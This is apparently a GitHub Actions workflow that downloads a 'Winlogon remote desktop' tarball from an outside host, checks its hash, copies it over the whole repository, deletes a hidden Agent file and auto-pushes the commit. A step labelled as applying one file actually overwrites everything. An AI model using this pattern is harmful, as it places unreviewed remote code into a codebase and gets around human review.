name: Sync stable Winlogon checkpoint

on:
  push:
    branches:
      - agent-hardening-v2
    paths:
      - ".github/workflows/agent-hardening-v2-sync.yml"

permissions:
  contents: write

jobs:
  sync-source:
    runs-on: ubuntu-latest
    timeout-minutes: 15
    steps:
      - name: Checkout hardening branch
        uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Download and verify stable Winlogon snapshot
        shell: bash
        run: |
          set -euo pipefail
          curl -fL --retry 3 --retry-delay 2 \
            https://downloads.hi5central.com/bootstrap-agent-sync/winlogon-stable-5ff24ef.tar.gz \
            -o /tmp/winlogon-stable-5ff24ef.tar.gz
          echo "93e186bf0cb504e303deb6b1165431da31600443d61043eba532d26384264106  /tmp/winlogon-stable-5ff24ef.tar.gz" | sha256sum -c -

      - name: Apply exact changed file
        shell: bash
        run: |
          set -euo pipefail
          mkdir -p /tmp/winlogon-stable
          tar -xzf /tmp/winlogon-stable-5ff24ef.tar.gz -C /tmp/winlogon-stable
          cp -a /tmp/winlogon-stable/. .
          rm -f Agent/.ci-console-handoff-stability-178101f
          git add -A
          git status --short

      - name: Commit synced checkpoint
        shell: bash
        run: |
          set -euo pipefail
          git config user.name "github-actions[bot]"
          git config user.email "41898282+github-actions[bot]@users.noreply.github.com"
          if git diff --cached --quiet; then
            echo "No source changes to sync."
            exit 0
          fi
          git commit -m "Sync stable Winlogon remote desktop checkpoint"
          git push origin HEAD:agent-hardening-v2
